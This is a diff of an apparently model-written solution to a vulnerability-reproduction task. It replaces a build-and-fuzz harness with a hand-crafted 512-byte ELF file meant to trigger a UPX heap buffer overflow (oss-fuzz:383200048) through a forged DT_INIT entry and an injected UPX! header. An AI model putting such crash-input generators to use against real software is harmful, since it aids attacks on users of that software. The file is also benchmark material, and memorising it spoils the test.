@@ -1,189 +1,66 @@
-import os
-import sys
-import subprocess
-import shutil
-import tempfile
-import random
-import time
-import concurrent.futures
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
-        Args:
-            src_path: Path to the vulnerable source code tarball
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
-        """
-        work_dir = tempfile.mkdtemp()
+        # Construct a 512-byte PoC for UPX Heap Buffer Overflow (oss-fuzz:383200048)
+        # The vulnerability involves un_DT_INIT and improper resetting of ph.method.
+        # We create an ELF64 file with a PT_DYNAMIC segment containing a crafted DT_INIT.
+        # We also inject UPX! magic to trigger the unpacking path.
+
+        # ELF64 Header
+        # e_ident: Magic, Class (64), Data (LE), Version, OSABI, ABIVersion, Pad
+        elf = bytearray(b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+        elf += struct.pack('<H', 3)   # e_type: ET_DYN
+        elf += struct.pack('<H', 62)  # e_machine: EM_X86_64
+        elf += struct.pack('<I', 1)   # e_version: EV_CURRENT
+        elf += struct.pack('<Q', 0)   # e_entry
+        elf += struct.pack('<Q', 64)  # e_phoff
+        elf += struct.pack('<Q', 0)   # e_shoff
+        elf += struct.pack('<I', 0)   # e_flags
+        elf += struct.pack('<H', 64)  # e_ehsize
+        elf += struct.pack('<H', 56)  # e_phentsize
+        elf += struct.pack('<H', 1)   # e_phnum
+        elf += struct.pack('<H', 64)  # e_shentsize
+        elf += struct.pack('<H', 0)   # e_shnum
+        elf += struct.pack('<H', 0)   # e_shstrndx
+
+        # Program Header (PT_DYNAMIC)
+        ph = bytearray()
+        ph += struct.pack('<I', 2)    # p_type: PT_DYNAMIC
+        ph += struct.pack('<I', 6)    # p_flags: RW
+        ph += struct.pack('<Q', 128)  # p_offset: Points to dynamic section
+        ph += struct.pack('<Q', 0)    # p_vaddr
+        ph += struct.pack('<Q', 0)    # p_paddr
+        ph += struct.pack('<Q', 32)   # p_filesz: 2 entries (16 bytes each)
+        ph += struct.pack('<Q', 32)   # p_memsz
+        ph += struct.pack('<Q', 8)    # p_align
+
+        data = elf + ph
         
-        try:
-            # 1. Extract source code
-            try:
-                subprocess.check_call(['tar', 'xf', src_path, '-C', work_dir], 
-                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except Exception:
-                # If extraction fails, we might be unable to proceed, but continue to try finding files
-                pass
+        # Pad to p_offset (128)
+        padding_len = 128 - len(data)
+        data += b'\x00' * padding_len
 
-            # 2. Locate source root and build UPX
-            src_root = work_dir
-            for root, dirs, files in os.walk(work_dir):
-                if 'Makefile' in files and ('src' in dirs or 'upx.out' in files):
-                    src_root = root
-                    break
-            
-            # Setup environment for ASAN build
-            env = os.environ.copy()
-            env['CC'] = 'clang'
-            env['CXX'] = 'clang++'
-            env['CFLAGS'] = '-fsanitize=address -g -O1'
-            env['CXXFLAGS'] = '-fsanitize=address -g -O1'
-            env['LDFLAGS'] = '-fsanitize=address'
-            
-            # Attempt to build
-            built = False
-            build_paths = [src_root]
-            if os.path.isdir(os.path.join(src_root, 'src')):
-                build_paths.insert(0, os.path.join(src_root, 'src'))
-            
-            for path in build_paths:
-                if os.path.exists(os.path.join(path, 'Makefile')):
-                    try:
-                        subprocess.run(['make', '-j8'], cwd=path, env=env, 
-                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-                        built = True
-                        break
-                    except subprocess.CalledProcessError:
-                        continue
-            
-            # If make failed, try cmake if present
-            if not built and os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
-                try:
-                    bdir = os.path.join(src_root, 'build_cmake')
-                    os.makedirs(bdir, exist_ok=True)
-                    subprocess.run(['cmake', '..'], cwd=bdir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    subprocess.run(['make', '-j8'], cwd=bdir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                except:
-                    pass
+        # Dynamic Section
+        # DT_INIT (12) with a large value to trigger OOB read/write in un_DT_INIT
+        data += struct.pack('<Q', 12)          # d_tag: DT_INIT
+        data += struct.pack('<Q', 0x7FFFFFFF)  # d_val: Large value
+        
+        # DT_NULL (0)
+        data += struct.pack('<Q', 0)           # d_tag: DT_NULL
+        data += struct.pack('<Q', 0)           # d_val
 
-            # Find the UPX binary
-            upx_bin = None
-            for root, dirs, files in os.walk(work_dir):
-                if 'upx.out' in files:
-                    upx_bin = os.path.join(root, 'upx.out')
-                    break
-                if 'upx' in files:
-                    cand = os.path.join(root, 'upx')
-                    if os.access(cand, os.X_OK):
-                        upx_bin = cand
-                        break
-            
-            if not upx_bin:
-                return b''
+        # Pad to 512 bytes
+        total_len = 512
+        padding_len = total_len - len(data)
+        data += b'\x00' * padding_len
 
-            # 3. Generate a seed file (Packed ELF Shared Library)
-            # Vulnerability is in decompression of ELF shared libraries.
-            # We create a minimal shared object.
-            source_c = os.path.join(work_dir, 'poc.c')
-            with open(source_c, 'w') as f:
-                f.write('void init_func(){}\n')
-            
-            so_path = os.path.join(work_dir, 'poc.so')
-            # Compile with DT_INIT set (-Wl,-init,...)
-            # Try clang then gcc
-            compiled = False
-            compilers = ['clang', 'gcc']
-            for cc in compilers:
-                try:
-                    subprocess.run([cc, '-shared', '-fPIC', '-Os', '-s', 'poc.c', '-o', 'poc.so', '-Wl,-init,init_func'],
-                                   cwd=work_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    compiled = True
-                    break
-                except:
-                    continue
-            
-            if not compiled:
-                return b''
+        # Inject UPX Magic to be detected as a packed file
+        # PackHeader is typically found near the end of the file.
+        # Placing UPX! at offset 512 - 36 = 476
+        data[476:480] = b'UPX!'
+        
+        # Set PackHeader version to pass initial checks
+        data[480] = 13
 
-            # Pack with UPX
-            seed_upx = os.path.join(work_dir, 'seed.upx')
-            # Use -1 for fast/small compression. 
-            subprocess.run([upx_bin, '-1', '-f', '-o', seed_upx, so_path],
-                           cwd=work_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            if not os.path.exists(seed_upx):
-                return b''
-
-            with open(seed_upx, 'rb') as f:
-                seed_data = bytearray(f.read())
-
-            # 4. Fuzzing to trigger vulnerability
-            # We look for Heap Buffer Overflow in ASAN output
-            found_poc = None
-            start_time = time.time()
-            time_limit = 300 # 5 minutes max
-            
-            def fuzz_worker(tid):
-                rng = random.Random()
-                rng.seed(time.time() + tid)
-                local_data = bytearray(seed_data)
-                
-                while time.time() - start_time < time_limit:
-                    # Mutation
-                    curr = bytearray(local_data)
-                    # Mutate 1-5% of bytes
-                    num_mutations = rng.randint(1, max(1, len(curr) // 50))
-                    for _ in range(num_mutations):
-                        idx = rng.randint(0, len(curr) - 1)
-                        op = rng.randint(0, 3)
-                        if op == 0: # Random byte
-                            curr[idx] = rng.randint(0, 255)
-                        elif op == 1: # Bit flip
-                            curr[idx] ^= (1 << rng.randint(0, 7))
-                        elif op == 2: # Arithmetic
-                            curr[idx] = (curr[idx] + rng.randint(-10, 10)) & 0xFF
-                        elif op == 3: # Interesting values
-                            curr[idx] = rng.choice([0, 0xFF, 0x7F, 0x80])
-                    
-                    # Test
-                    fname = os.path.join(work_dir, f'fuzz_{tid}_{rng.randint(0, 100000)}.upx')
-                    with open(fname, 'wb') as f:
-                        f.write(curr)
-                    
-                    try:
-                        # -d to decompress/test, -o /dev/null to discard output
-                        res = subprocess.run([upx_bin, '-d', '-o', os.devnull, fname],
-                                             stdout=subprocess.DEVNULL,
-                                             stderr=subprocess.PIPE,
-                                             env=env,
-                                             timeout=1)
-                        
-                        if res.returncode != 0:
-                            if b'AddressSanitizer' in res.stderr and b'heap-buffer-overflow' in res.stderr:
-                                return bytes(curr)
-                    except Exception:
-                        pass
-                    finally:
-                        if os.path.exists(fname):
-                            os.remove(fname)
-                return None
-
-            # Run parallel fuzzers
-            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
-                futures = [executor.submit(fuzz_worker, i) for i in range(8)]
-                for f in concurrent.futures.as_completed(futures):
-                    res = f.result()
-                    if res:
-                        found_poc = res
-                        executor.shutdown(wait=False)
-                        break
-            
-            # Return found PoC or original seed if no crash found
-            return found_poc if found_poc else bytes(seed_data)
-
-        except Exception:
-            return b''
-        finally:
-            shutil.rmtree(work_dir, ignore_errors=True)
+        return bytes(data)
